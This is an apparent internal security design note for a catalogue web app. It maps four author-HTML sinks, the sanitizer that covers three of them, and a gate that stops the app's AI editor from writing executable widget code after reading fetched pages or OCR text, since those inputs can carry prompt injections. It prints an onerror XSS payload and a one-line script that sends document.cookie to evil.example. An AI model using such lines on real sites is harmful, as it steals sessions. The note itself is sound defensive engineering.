# Author HTML on a published catalogue

Four places let a catalogue carry markup the app did not write. This is what
each one does today, what filters it, and the one that is still open.

It matters more than it looks: a published catalogue is served from
`/catalogues/[name]` in the same Next app as the signed-in builder, so markup
running there is same-origin with the app. In the builder's preview
(`mode: "edit"`) it runs inside the owner's authenticated session.

And the author is not always the owner. The AI editor writes all four, and it
writes them while holding text it did not get from the user: a page pulled in
by `fetchUrl`, or the OCR of a photo someone handed the owner to scan. Both are
inputs an attacker can choose.

---

## The four sinks

| Sink | Written by | How it renders | Filtered? |
|---|---|---|---|
| Text section `content` | builder, AI | `HtmlContent` → `dangerouslySetInnerHTML` | **Yes** - `text` profile |
| Catalogue `heading` | builder, AI | `HtmlContent` | **Yes** - `text` profile |
| `embedding` block `code` | builder, AI | `HtmlContent` | **Yes** - `embed` profile |
| `custom_code` block `code` | builder, AI | own mount, scripts re-created to execute | **No** - see below |

### The three that are filtered

`helpers/sanitizeHtml.ts` runs inside `components/general/HtmlContent.tsx`, the
one component where author HTML becomes live DOM. Filtering there rather than
at each call site covers the AI, the builder, imported catalogues and rows that
predate any of this, in one place. It runs on the server too, so the SSR output
is already clean and text sections keep their SEO value.

It is an allowlist, so `on*` handlers, `<script>`, `<form>`, `<svg>`,
`<object>` and everything else unnamed are gone without being enumerated. The
`embed` profile additionally permits `<iframe>`, restricted to the hosts in
`EMBED_HOSTS` - matched as an exact host or a `.host` suffix, so
`player.vimeo.com` passes and `youtube.com.evil.example` does not.

Before this, `<img src=x onerror=...>` in any of the three reached the page
intact. Note that the code gate's old advice made this worse rather than
better: when it blocked a widget it told the model to *"add what you found as a
text or category section instead"* - routing page-derived content into an
equally unfiltered sink.

### The one that is not

`custom_code` does not go through `HtmlContent`. `CustomCode.tsx` mounts the
fragment itself and then **deliberately re-creates every `<script>` node so it
executes**, because a script inserted via `innerHTML` is inert. That is the
feature: interactive widgets, games, calculators. Five tests cover it.

**A source-text allowlist cannot secure this.** Inline `<script>` is allowed by
design, so stripping `<script src>` and `fetch` is cosmetic - one line of inline
JS defeats it:

```js
new Image().src = "https://evil.example/?c=" + document.cookie;
```

There is no filter over JavaScript source that fixes that while still letting
widgets run. The control has to be isolation, not inspection.

Which is why `requireNoWebCode` in `agent/session.ts` still stands: after
`fetchUrl` has run, the agent cannot write `custom_code` or `embedding`. It is
blunt and it blocks legitimate work - a user asking to build a catalogue from
their website *and* add a widget gets the widget refused - but with the sink
unguarded it is the only thing between an injected page and executable markup
on a live catalogue.

`embedding` stays gated too, even though it is now filtered. The allowlist
includes `stripe.com` and `paypal.com`, so an injected page could still get a
payment iframe pointing at an account the owner does not control onto their
page. Lower severity than XSS, still fraud.

---

## What would close it

Render `custom_code` in a sandboxed iframe:

```html
<iframe sandbox="allow-scripts" srcdoc="...">
```

`allow-scripts` **without** `allow-same-origin` puts the widget in an opaque
origin: no parent DOM, no cookies, no same-origin credentialed requests. The
widget still runs; it just cannot reach anything. `requireNoWebCode` then has
nothing left to protect and can be deleted, which is what unblocks
"build from my site, and add a widget".

It is not free:

- **Height.** An iframe does not size to its content. Needs a `ResizeObserver`
  inside posting to the parent over `postMessage` (which works from an opaque
  origin; the parent matches on `event.source`, not origin).
- **Theme.** The fragment stops inheriting the catalogue's fonts and CSS
  variables. They would have to be injected into the `srcdoc`.
- **Existing widgets.** Anything already published that reads the parent page
  changes behaviour. The documented `document.currentScript.parentNode` pattern
  survives - inside the iframe that is still the fragment's own parent - but
  the five tests in `tests/unit/components/` assert in-page mounting and would
  be rewritten.

That is a change to how every published catalogue renders widgets, for every
customer, so it is a decision rather than a cleanup. Until it is made, the gate
stays and widgets after a page read stay blocked.
